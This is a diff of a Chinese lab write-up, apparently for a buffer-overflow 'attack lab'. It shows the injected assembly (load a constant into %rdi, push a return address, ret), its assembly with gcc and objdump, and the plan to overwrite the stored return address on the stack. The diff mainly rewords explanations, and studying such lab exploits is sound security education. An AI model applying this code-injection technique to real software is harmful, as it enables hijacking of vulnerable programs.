@@ -113,7 +113,7 @@ ret
 ```
 
 
-编写一个move.s文件
+编写一个move.s文件, 直接写入需要的assembly instructions
 
 ```assembly
 movq $0x59b997fa, %rdi
@@ -121,13 +121,13 @@ pushq $0x4017ec
 ret
 ```
 
-执行
+执行gcc -c (compile and assemble, but do not link), 得到object file  move.o
 
 ```bash
 > gcc -c move.s
 ```
 
-得到move.o, 然后objdump出指令的hex value
+然后objdump出指令的hex value
 
 ```bash
 > objdump -d move.o
@@ -141,7 +141,7 @@ Disassembly of section .text:
 c:	c3                   	retq
 ```
 
-我们需要一个改写原本ret的地址为movq  $0x59b997fa,%rdi的地址
+我们需要一个改写原本ret的地址为 movq $0x59b997fa,%rdi的地址
 
 那么我们需要把这个mov即后续指令放在stack上的某个位置即可
 
